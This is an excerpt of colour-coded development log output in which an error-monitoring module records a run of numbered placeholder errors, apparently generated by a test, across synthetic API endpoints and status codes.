WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 738'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723486Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 739'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 740'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 741'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723716Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 742'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 743'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723817Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 744'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 745'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723916Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 746'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.723965Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 747'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724013Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 748'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724062Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m15[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 749'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724110Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 750'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 751'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724209Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 752'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724258Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 753'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 754'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724355Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 755'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724403Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 756'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724452Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 757'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724499Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 758'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724547Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 759'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724595Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 760'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724645Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 761'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724694Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 762'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724742Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 763'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724790Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 764'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 765'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.724951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 766'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 767'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 768'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 769'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 770'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725213Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 771'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725262Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 772'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725311Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 773'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725403Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 774'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725476Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 775'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725532Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 776'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.725584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m16[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 777'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
